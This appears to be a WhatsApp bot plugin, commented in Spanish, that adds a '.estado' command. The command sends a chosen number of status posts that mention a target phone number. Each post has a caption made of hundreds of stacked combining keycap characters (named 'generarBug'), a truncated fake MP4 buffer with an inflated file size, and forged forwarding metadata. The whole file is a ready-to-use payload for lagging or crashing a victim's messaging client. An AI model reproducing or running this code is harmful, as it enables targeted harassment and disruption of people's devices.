let handler = async (m, { conn, text }) => {
  if (!text) throw 'Ejemplo:\n.estado +521234567890/10'

  let [num, count] = text.split('/')
  let numero = num.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let cantidad = parseInt(count)

  if (isNaN(cantidad) || cantidad < 1) throw 'Cantidad inválida'

  function generarBug() {
    let base = 'o\u20E3'

    let REPETICION_HORIZONTAL = 120 // ← aquí cambias peso
    let REPETICION_VERTICAL = 8     // ← aquí cambias líneas

    let linea = base.repeat(REPETICION_HORIZONTAL)
    return (linea + '\n').repeat(REPETICION_VERTICAL)
  }

  // 🎥 video mínimo válido (NO fake roto)
  const videoBuffer = Buffer.from([
    0x00,0x00,0x00,0x18,0x66,0x74,0x79,0x70,
    0x6D,0x70,0x34,0x32,0x00,0x00,0x00,0x00
  ])

  for (let i = 0; i < cantidad; i++) {
    await conn.sendMessage('status@broadcast', {
      video: videoBuffer,
      caption: generarBug(),
      mimetype: 'video/mp4',
      fileLength: 500000,
      seconds: 5,
      contextInfo: {
        mentionedJid: [numero],
        isForwarded: true,
        forwardingScore: 999
      }
    })

    await new Promise(r => setTimeout(r, 2000))
  }

  m.reply(`✅ ${cantidad} estados enviados`)
}

handler.command = ['estado']
export default handler
